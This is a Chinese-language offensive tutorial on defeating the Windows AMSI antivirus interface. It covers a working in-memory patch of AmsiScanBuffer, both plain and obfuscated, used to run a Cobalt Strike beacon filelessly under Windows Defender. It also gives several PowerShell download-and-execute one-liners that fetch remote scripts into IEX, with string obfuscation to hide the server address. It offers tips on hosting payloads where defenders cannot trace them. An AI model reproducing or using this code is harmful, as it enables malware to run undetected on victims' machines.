

# 反病毒引擎AMSI的浅析和绕过





## 0x01.通过修补 AMSI.dll 的操作码绕过ASMI

1.用cobaltstrike生成一个beacon.ps1,当然你用generator也可以

![image-20220225144853732](C:\Users\16915\Desktop\bypass asmi\image-20220225144853732.png)

![image-20220225144807813](C:\Users\16915\Desktop\bypass asmi\image-20220225144807813.png)



注意我这里用的是64位的stageless，所以文件比较大

![image-20220225145225104](C:\Users\16915\Desktop\bypass asmi\image-20220225145225104.png)

这里使用C#加密器对整个ps1文件进行base64加密

![image-20220225145408952](../../AppData/Roaming/Typora/typora-user-images/image-20220225145408952.png)



重新创建一个文件命名为pay.ps1,将上面的base64密文复制粘贴到下面代码的$decryption字符串变量中

$Address 后面一串就是base64解密公式。然后用IEX 去执行这个字符串变量

![image-20220225150152460](C:\Users\16915\Desktop\bypass asmi\image-20220225150152460.png)

但是amsi.dll对IEX是有严格限制的，直接执行解密密文必然会 被拦截

因此这里我们需要一段破坏或者劫持amsi.dll的ps代码

```
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

当然如果你怕代码被云标记的话可以加一些混淆，比如说字符串的分裂，或者转换成ASCLL字符码

```
#导入API 函数
$ftkgk = @"
using System;
using System.Runtime.InteropServices;
public class ftkgk {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr gusdon, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ftkgk
#通过 rasta-mouse 修补 amsi.dll AmsiScanBuffer
$lospbeo = [ftkgk]::LoadLibrary("$(('âms'+'í.d'+'ll').NOrMALiZe([cHAr](58+12)+[cHAR](111+96-96)+[cHAr](114+68-68)+[char](109+99-99)+[chAR]([bYte]0x44)) -replace [CHAr](92+22-22)+[CHaR](112)+[cHAr]([bYTE]0x7b)+[ChaR]([BYTe]0x4d)+[chAR]([byTE]0x6e)+[ChaR](125))")
$bhijoj = [ftkgk]::GetProcAddress($lospbeo, "$(('ÁmsìScànB'+'uffer').NOrmalizE([ChaR](70+60-60)+[chAR](111+76-76)+[chaR](114)+[char](109*69/69)+[CHAr]([ByTE]0x44)) -replace [ChaR](74+18)+[ChAR]([BYTE]0x70)+[cHAr](123)+[cHaR](77+31-31)+[CHar](110+64-64)+[Char](125+30-30))")
$p = 0
[ftkgk]::VirtualProtect($bhijoj, [uint32]5, 0x40, [ref]$p)
$jniv = "0xB8"
$kgmv = "0x57"
$odgn = "0x00"
$zalk = "0x07"
$cfun = "0x80"
$macm = "0xC3"
$hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)
[System.Runtime.InteropServices.Marshal]::Copy($hquzq, 0, $bhijoj, 6)
```

将混淆过后的代码插入解密代码中

![image-20220225171012792](C:\Users\16915\Desktop\bypass asmi\image-20220225171012792.png)

放在windows defender环境下无文件执行即可

![image-20220225171359847](C:\Users\16915\Desktop\bypass asmi\image-20220225171359847.png)

可以看到可以绕过微软，能执行一些基本的命令，但是dumplass应该不行。

## **绕过原理**

2018 年 5 月，CyberArk 发布了 POC 代码，通过修补其功能之一，即 AmsiScanBuffer() 来绕过 AMSI

AmsiScanBuffer 的API原型

```
HRESULT AmsiScanBuffer(
	HAMSICONTEXT amsiContext,
	PVOID buffer,   //缓冲区
	ULONG length,   //长度
	LPCWSTR contentName,
	HAMSISESSION amsiSession,
	AMSI_RESULT *result 
);
```

其中一个参数“长度”本质上是绕过的关键。此参数包含要扫描的字符串的长度。如果通过某种方式将参数设置为常数值 0，则 AMSI 将被有效地绕过，因为 AmsiScanBuffer 函数将假定任何后续要扫描的字符串的长度都为 0。这是通过在运行时修补 AMSI.dll 的操作码来实现的。

使用GetProcAddress()函数获取 AmsiScanBuffer() 的句柄，找到amsi.dll带修补的地址

![image-20220225181129080](C:\Users\16915\Desktop\bypass asmi\image-20220225181129080.png)

还有其他方法可以实现这一点。SecureYourIt 一篇博客文章（https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/）显示了不同的定位“AmsiScanBuffer()”的方法。不是直接将句柄设置为“AmsiScanBuffer()”，而是首先将句柄设置为“AmsiUacInitialize()”。从句柄中减去值 256 随后将导致句柄指向“AmsiScanBuffer()”。

![image-20220225181054648](C:\Users\16915\Desktop\bypass asmi\image-20220225181054648.png)

在上面的示例中，句柄设置为“AmsiUacInitialize()”，尽管你可以在技术上使用 Amsi.dll 中的任何函数。这种方法在针对“AmsiScanBuffer()”创建签名的情况下很有用。

## 0x02.分离免杀:抛弃 net webclient 远程加载方式（一）

这里采用.net中的webrequest去请求远程恶意样本内容、读取样本、并执行样本。其实加载原理都是用IEX去执行远程的样本内容，大同小异，这边只是修改了一些特征，这里执行的前提是远程加载的powershell样本也得免杀，我们通常会将样本放置在网页可以访问的web服务器上，但是这同时也带来了风险，因为有些高级防病毒软件会标记一些恶意的公网IP（比如说卡巴斯基、小红伞），如果你将样本托管GitHub，虽然虽不会被防病毒标记，但是实战中一下就被蓝队溯源了，我这里推荐一个可以在公网上挂起文本并且合法的网站https://paste.ee/  

```
$webreq = [System.Net.WebRequest]::Create(‘0.0.0.0/1.ps1’)
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()
IEX($content)
```

我们可以用replace函数添加一些符号或者数字去混淆、替换暴露出来的IP地址

![image-20220225183422626](C:\Users\16915\Desktop\bypass asmi\image-20220225183422626.png)

当然有IEX的地方amsi.dll肯定会重点扫描，你必须在IEX执行之前就破坏它，因此这里可以在$content=$reader.ReadToEnd()和IEX($content)插入破坏amsi.dll的代码。

![image-20220225193018689](C:\Users\16915\Desktop\bypass asmi\image-20220225193018689.png)



## 0x03.远程加载方式（二）

```
IEX ((new-object net.webclient).downloadstring('http://0.0.0.0:8000/bypass.txt'.))
```

同样的我们可以通过Replace函数去替换字符串来混淆IP地址（远程的powershell样本必须免杀）

```
IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()2.202.188@@@@@:8000/byp**************ass.tx**************t".Replace('@@@@@','').Replace('@!#$%^&*()','').Replace('**************',''))
```

![image-20220225212713906](C:\Users\16915\Desktop\bypass asmi\image-20220225212713906.png)

## 0x04.远程加载方式（三）

```
IEX([Net.Webclient]::new().DownloadString("http://0.0.0.0:8000/bypass.txt".))
```

这个方法和方式二类似，本质上还是用webclient去连接服务端的方式进行通信

混淆后的样本为

```
IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t".Replace('@@@@@','').Replace('%%%','')))
```

![image-20220225220216013](C:\Users\16915\Desktop\bypass asmi\image-20220225220216013.png)